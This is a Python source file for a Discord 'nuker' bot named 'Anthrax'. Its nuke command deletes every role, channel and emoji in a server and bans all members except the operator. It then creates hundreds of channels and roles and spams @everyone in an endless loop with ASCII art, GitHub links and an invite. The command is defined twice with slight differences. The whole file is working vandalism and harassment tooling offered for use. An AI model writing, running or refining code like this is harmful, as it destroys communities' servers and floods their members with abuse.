import discord
from discord.ext import commands
from discord.ext.commands import bot
from discord.utils import get

token = "Put your discord bot token here, keep the quotes :)"
my_id = 715385148941795458

bot_intents = discord.Intents(messages = True, guilds = True, members = True)
bot = commands.Bot(command_prefix='!', intents = bot_intents)
bot.remove_command("help")

@bot.event
async def on_ready():
    print ("Anthrax Is Ready --- github.com/Maywitz")

@bot.event
async def on_message(message):
    try:
        await bot.process_commands(message)
    except:
        return

@bot.command()
async def nuke(ctx):

    try:
        await ctx.message.delete()
    except:
        pass
        
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
            print ("Role " + role.name + " has been deleted")
        except:
            pass
            print ("Role " + role.name + " has failed to be deleted")
            
    await ctx.guild.edit(
    name = "Anthrax",
    description = "Anthrax",
    reason = "Anthrax",
    icon = None,
    banner = None
    )
    
    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
            print (channel.name + " has been deleted")
        except:
            pass
            print (channel.name + " has failed to be deleted")
            
    for member in list(bot.get_all_members()):
        try:
            if member.id != my_id:
                await ctx.guild.ban(member)
                print ("User " + member.name + " has been banned")
        except:
            print ("User " + member.name + " has failed to be banned")
            
    for _i in range(500):
        try:
            await ctx.guild.create_text_channel("Anthrax")
            print ("Channel Created")
        except:
            print ("Failed to create channel")
            
    for _i in range(100):
        try:
            await ctx.guild.create_role(name = "Anthrax")
            print ("Role Created")
        except:
            print ("Failed to create role")
            
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print ("Emoji " + emoji.name + " has been deleted")
        except:
            print ("Emoji " + emoji.name + " has failed to be deleted")

    while True:
        for channel in list(ctx.message.guild.channels):
            try:
                await channel.send("""
@everyone
```
          _   _ _______ _    _ _____            __   __
    /\   | \ | |__   __| |  | |  __ \     /\    \ \ / /
   /  \  |  \| |  | |  | |__| | |__) |   /  \    \ V / 
  / /\ \ | . ` |  | |  |  __  |  _  /   / /\ \    > <  
 / ____ \| |\  |  | |  | |  | | | \ \  / ____ \  / . \ 
/_/    \_\_| \_|  |_|  |_|  |_|_|  \_\/_/    \_\/_/ \_\
```
""")
                await channel.send("""
@everyone
```
  __  __       __     ___          _______ _______ ______
 |  \/  |   /\ \ \   / \ \        / /_   _|__   __|___  /
 | \  / |  /  \ \ \_/ / \ \  /\  / /  | |    | |     / / 
 | |\/| | / /\ \ \   /   \ \/  \/ /   | |    | |    / /  
 | |  | |/ ____ \ | |     \  /\  /   _| |_   | |   / /__ 
 |_|  |_/_/    \_\|_|      \/  \/   |_____|  |_|  /_____|
```
""")
                await channel.send("@everyone\nhttps://github.com/Maywitz")
                await channel.send("@everyone\nhttps://github.com/Maywitz/Anthrax-Nuker")
                await channel.send("@everyone\nhttps://discord.gg/dZq52WJaKW")
            except:
                print (channel.name + " has failed to be pinged")
                
@bot.command()
async def nuke(ctx):

    try:
        await ctx.message.delete()
    except:
        pass
        
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
            print ("Role " + role.name + " has been deleted")
        except:
            pass
            print ("Role " + role.name + " has failed to be deleted")
            
    await ctx.guild.edit(
    name = "Anthrax",
    description = "Anthrax",
    reason = "Anthrax",
    icon = None,
    banner = None
    )
    
    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
            print (channel.name + " has been deleted")
        except:
            pass
            print (channel.name + " has failed to be deleted")
            
    for _i in range(500):
        try:
            await ctx.guild.create_text_channel("Anthrax")
            print ("Channel Created")
        except:
            print ("Failed to create channel")
            
    for _i in range(100):
        try:
            await ctx.guild.create_role(name = "Anthrax")
            print ("Role Created")
        except:
            print ("Failed to create role")
            
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print ("Emoji " + emoji.name + " has been deleted")
        except:
            print ("Emoji " + emoji.name + " has failed to be deleted")

    while True:
        for channel in list(ctx.message.guild.channels):
            try:
                await channel.send("""
@everyone
```
          _   _ _______ _    _ _____            __   __
    /\   | \ | |__   __| |  | |  __ \     /\    \ \ / /
   /  \  |  \| |  | |  | |__| | |__) |   /  \    \ V / 
  / /\ \ | . ` |  | |  |  __  |  _  /   / /\ \    > <  
 / ____ \| |\  |  | |  | |  | | | \ \  / ____ \  / . \ 
/_/    \_\_| \_|  |_|  |_|  |_|_|  \_\/_/    \_\/_/ \_\
```
""")
                await channel.send("""
@everyone
```
  __  __       __     ___          _______ _______ ______
 |  \/  |   /\ \ \   / \ \        / /_   _|__   __|___  /
 | \  / |  /  \ \ \_/ / \ \  /\  / /  | |    | |     / / 
 | |\/| | / /\ \ \   /   \ \/  \/ /   | |    | |    / /  
 | |  | |/ ____ \ | |     \  /\  /   _| |_   | |   / /__ 
 |_|  |_/_/    \_\|_|      \/  \/   |_____|  |_|  /_____|
```
""")
                await channel.send("@everyone\nhttps://github.com/Maywitz")
                await channel.send("@everyone\nhttps://github.com/Maywitz/Anthrax-Nuker")
                await channel.send("@everyone\nhttps://discord.gg/dZq52WJaKW")
            except:
                print (channel.name + " has failed to be pinged")


bot.run(token)
